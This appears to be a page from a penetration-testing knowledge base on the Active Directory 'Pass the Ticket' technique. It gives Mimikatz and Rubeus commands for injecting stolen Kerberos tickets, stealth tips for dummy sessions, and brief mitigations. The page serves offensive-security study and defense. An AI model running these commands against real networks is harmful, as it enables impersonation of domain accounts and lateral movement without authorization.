---
layout: default
title: Pass the Ticket
parent: Active Directory
nav_order: 12
permalink: /ad/passtheticket/
---

# Pass the Ticket
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

If you gain local administrator rights on a domain joined computer, you can take advantage of this situation to extract Kerberos tickets and import them in your current session to impersonate a user. By doing this, you could be able to lateralize on the network and access other services protected with Kerberos authentication.

## Prerequisites

* Local administrator rights on a domain joined computer.

## Exploit

To export Kerberos tickets, please refer to [Cached Credentials Extraction](/windows/credentials/) page. Once you extracted the Kerberos TGT or TGS you want, you can now import it in your current session. TGS format is something like **`[0;12bd0]-0-0-40810000-<$username>@cifs-<$target>.kirbi`.**

{: .warning }
> Since a session can contain only one TGT at the time, injecting Kerberos ticket inside an existing session **might cause authentication issues** for the user. Prefer create a dummy session before by using one of the commands below. More, if you want to be stealthy, provide usernames that sound legit.
> ```
> # With command prompt.
> runas.exe /netonly /user:$whatever C:\Windows\System32\cmd.exe
> 
> # With Rubeus, more stealthy since you provide a legit username.
> .\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /username:$whatever /password:$whatever 
> ```

To inject the ticket, you can use [Mimikatz](https://github.com/gentilkiwi/mimikatz).

```bash
kerberos::ptt [0;12bd0]-0-0-40810000-<$username>@cifs-<$target>.kirbi

# List current Kerberos tickets to check injection worked.
klist
```

You can also perform this attack using [Rubeus](https://github.com/GhostPack/Rubeus).

```powershell
.\Rubeus.exe ptt /luid:$luid /ticket:$Base64EncodedTicket

# List current Kerberos tickets to check injection worked.
.\Rubeus.exe triage
```

You can now take advantage of this ticket to lateralize on the network by impersonating the corresponding account.

## Recommendations

- [ ] Enable additional LSA Protection. The LSA includes the LSASS process. By setting a registry key, Windows prevents reading memory from this process.
- [ ] Enforce EDR on computers to detect and prevent Mimikatz usage.